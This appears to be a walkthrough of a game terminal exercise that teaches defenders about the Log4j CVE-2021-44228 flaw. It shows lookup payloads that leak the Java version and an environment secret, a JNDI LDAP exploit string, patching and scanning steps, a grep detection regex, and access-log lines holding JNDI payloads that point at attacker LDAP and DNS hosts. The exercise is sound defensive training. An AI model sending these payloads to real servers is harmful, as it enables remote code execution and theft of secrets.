@@ -1,0 +1,189 @@
+In-game terminal
+Objective: Learning about Log4j vulnerability as a blue team (defender).
+
+
+(Directory listing)
+~$ ls
+
+
+(Change to directory: vulnerable)
+~$ cd vulnerable/
+
+
+(Display content of DisplayFilev1.java)
+~$ cat DisplayFilev1.java
+  import java.io.*;
+
+  public class DisplayFilev1 {
+    public static void main(String[] args) throws Exception {
+
+        File file = new File(args[0]);
+        BufferedReader br = new BufferedReader(new FileReader(file));
+
+        String st;
+        while ((st = br.readLine()) != null) {
+            System.out.println(st);
+        }
+    }
+  }
+
+
+(CLI argument = file to display content of. Compile it.)
+~$ javac DisplayFilev1.java
+
+
+(Run it on testfile.txt)
+~$ java DisplayFilev1 testfile.txt
+
+
+(Run it on testfile2.txt)
+~$ java DisplayFilev1 testfile2.txt
+
+
+(File doesn't exist => error. Display new code with logging)
+~$ cat DisplayFilev2.java
+  import java.io.*;
+  import org.apache.logging.log4j.Logger;
+  import org.apache.logging.log4j.LogManager;
+
+  public class DisplayFilev2 {
+    static Logger logger = LogManager.getLogger(DisplayFilev2.class);
+    public static void main(String[] args) throws Exception {
+        String st;
+        try {
+            File file = new File(args[0]);
+            BufferedReader br = new BufferedReader(new FileReader(file));
+
+            while ((st = br.readLine()) != null)
+                System.out.println(st);
+        }
+        catch (Exception e) {
+            logger.error("Unable to read file " + args[0] + " (make sure you specify a valid file name).");
+        }
+    }
+  }
+
+
+(First few lines add support for Log4j. 4th line from bottom logs the error. Compile it.)
+~$ javac DisplayFilev2.java
+
+
+(Run it on non-existing file.)
+~$ java DisplayFilev2 testfile2.txt
+  ERROR DisplayFilev2 - Unable to read file testfile2.txt (make sure you specify a valid file name).
+
+
+(Log4j auto gen consistent error message about unable to read file. But vulnerabilities in Log4j library exist.)
+(CVE-2021-44228 Log4j vulnerability. Discloses info about the host.)
+~$ java DisplayFilev2 '${java:version}'
+  ERROR DisplayFilev2 - Unable to read file Java version 1.8.0_312 (make sure you specify a valid file name).
+
+
+(Discloses value of a local variable. Attackers can use Java Naming and Directory Interface (JNDI) to exfiltrate to attacker's server.)
+~$ java DisplayFilev2 '${env:APISECRET}'
+  ERROR DisplayFilev2 - Unable to read file pOFZFiWHjqKoQaRhNYyC (make sure you specify a valid file name).
+
+
+(Launch simple listening server for testing LDAP and DNS exfiltration.)
+~$ startserver.sh
+
+
+(Exploit Log4j lookup to connect to the (attacker) server.)
+~$ java DisplayFilev2 '${jndi:ldap://127.0.0.1:1389/Exploit}'
+
+
+(Change directory with updated version of Log4j)
+~$ cd ~/patched
+
+
+(Update Java CLASSPATH variable to use updated library.)
+~$ source classpath.sh
+
+
+(Recompile.)
+~$ javac DisplayFilev2.java
+
+
+(Retry exploit. Can't, because it's patched.)
+~$ java DisplayFilev2 '${java:version}'
+  ERROR DisplayFilev2 - Unable to read file ${java:version} (make sure you specify a valid file name).
+
+
+(Scan for Log4j vulnerabilities in the vulnerable/ directory.)
+~$ log4j2-scan vulnerable/
+  Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
+  Scanning directory: vulnerable/ (without tmpfs, shm)
+  [*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /home/elfu/vulnerable/log4j-core-2.14.1.jar, log4j 2.14.1
+
+  Scanned 1 directories and 8 files
+  Found 1 vulnerable files
+  Found 0 potentially vulnerable files
+  Found 0 mitigated files
+  Completed in 0.00 seconds
+
+
+(Repeat on patched/ directory.)
+~$ log4j2-scan patched/
+  Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
+  Scanning directory: patched/ (without tmpfs, shm)
+
+  Scanned 1 directories and 5 files
+  Found 0 vulnerable files
+  Found 0 potentially vulnerable files
+  Found 0 mitigated files
+  Completed in 0.00 seconds
+
+
+(Server includes Apache Solr software using Log4j. Scan the /var/www/solr directory.)
+~$ log4j2-scan /var/www/solr
+  Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
+  Scanning directory: /var/www/solr (without tmpfs, shm)
+  [*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /var/www/solr/server/lib/ext/log4j-core-2.14.1.jar, log4j 2.14.1
+  [*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /var/www/solr/contrib/prometheus-exporter/lib/log4j-core-2.14.1.jar, log4j 2.14.1
+
+  Scanned 102 directories and 1988 files
+  Found 2 vulnerable files
+  Found 0 potentially vulnerable files
+  Found 0 mitigated files
+  Completed in 0.53 seconds
+
+
+(2 vulernable files: 1 for Solr platform and 1 for 3rd party plugin.)
+(CVE-2021-44228 Log4j exploit using JNDI for access is known as Log4shell. Uses JNDI lookup to manipulate logs, gain access, or run commands. Web app servers = common targets. Examine files in /var/log/www directory.)
+~$ ls /var/log/www
+  access.log
+
+
+(Examine logshell-search.sh script.)
+~$ cat logshell-search.sh
+  #!/bin/sh
+  grep -E -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' $1
+
+
+(It recursively searches for Log4shell syntax in any file using regex. Search that access log.)
+~$ logshell-search.sh /var/log/www
+  /var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
+  /var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
+  /var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"
+
+
+(3 lines. Rerun to look like line 1 only.)
+~$ logshell-search.sh /var/log/www | sed '1!d'
+  /var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
+
+
+(^ First line, attacker at 10.26.4.27. Log4j lookup command sent as URL GET parameter to reach LDAP server at ldap://10.26.4.27:1389.)
+
+
+~$ logshell-search.sh /var/log/www | sed '2!d'
+  /var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
+
+
+(^ Second line, attacker at 10.99.3.1. Sent through browser User-Agent field. Attempt to reach DNS server at dns://10.99.3.43; using a different IP address.)
+
+
+~$ logshell-search.sh /var/log/www | sed '3!d'
+  /var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"
+
+
+(^ Third line, attacker at 10.3.243.6. Also sent through browser User-Agent field, but using attack LDAP server at 10.3.243.6. DefinitelyLegitimate string is by the attacker, matching malicious Java class on LDAP server.)
